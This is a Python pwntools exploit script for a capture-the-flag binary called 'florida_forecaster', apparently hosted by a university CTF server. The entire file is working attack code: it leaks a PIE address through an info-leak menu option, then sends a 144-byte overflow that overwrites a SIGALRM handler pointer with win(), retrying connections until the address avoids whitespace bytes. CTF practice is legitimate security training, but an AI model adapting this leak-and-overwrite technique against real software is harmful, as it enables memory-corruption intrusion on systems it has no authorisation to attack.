#!/usr/bin/env python3
# Ported to python3 / modern pwntools for the archive revival.
# Original technique preserved: leak a stack/PIE address via the "forecast
# parameters" info leak, overwrite the SIGALRM handler callback with the win()
# function, then wait for the alarm to fire.
#
# The offset between win and vulnerable_function is read from the debug build
# (florida_forecaster.debug), so this stays correct for a freshly rebuilt binary.
from pwn import *
import os

exe = ELF(".build/florida_forecaster.debug" if os.path.exists(".build/florida_forecaster.debug") else "florida_forecaster.debug", checksec=False)
context(binary=exe)

LEAK_OFFSET = exe.symbols["win"] - exe.symbols["vulnerable_function"]


def read_prompt(target):
    return target.recvuntil(b': ')


def leak_address(target):
    read_prompt(target)
    target.sendline(b'3')
    read_prompt(target)
    target.sendline(b'1061109567')
    read_prompt(target)
    target.sendline(b'-1')
    vuln_func_addr = int(target.readline(), 16)
    log.info("leaked addr: 0x%x" % vuln_func_addr)
    return vuln_func_addr


def exploit(target, dest_addr):
    read_prompt(target)
    target.sendline(b'2')
    target.recvuntil(b'Enter test data\n')
    # scanf("%s") stops at C whitespace bytes (space, \t, \n, \v, \f, \r).
    # If the low byte of the target address is one of those, nudge the address
    # so the payload isn't truncated before the function pointer is written.
    c = dest_addr & 0xff
    if c == ord('\n'):
        dest_addr += 4  # skip prologue
    elif c in (0x09, 0x0b, 0x0c, 0x0d, 0x20):
        dest_addr += 1
    target.sendline(b'A' * 144 + p64(dest_addr) + p8(8))
    log.info("Wait for flag (alarm fires after ~30s)...")
    print(target.recvall(timeout=60).decode("latin1"))


def connect():
    if args.LOCAL:
        return process('./florida_forecaster')
    return remote(os.environ.get('HOST') or args.HOST or 'ctf.hackucf.org', int(os.environ.get('PORT') or args.PORT or 20002))


def win_has_whitespace(win_addr):
    # scanf("%s") truncates the payload at any C whitespace byte of the
    # function pointer (except the low byte, which exploit() nudges around).
    ws = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}
    return any(b in ws for b in p64(win_addr)[1:])


if __name__ == '__main__':
    # PIE randomizes the win() address each connection. Only a win address with
    # no internal whitespace bytes survives scanf("%s"), so retry until we get a
    # usable one, then fire the exploit (flag arrives after the ~30s alarm).
    for attempt in range(40):
        t = connect()
        vuln_func_addr = leak_address(t)
        win_addr = vuln_func_addr + LEAK_OFFSET
        if win_has_whitespace(win_addr):
            log.info("win=0x%x has whitespace byte, retrying" % win_addr)
            t.close()
            continue
        exploit(t, win_addr)
        break

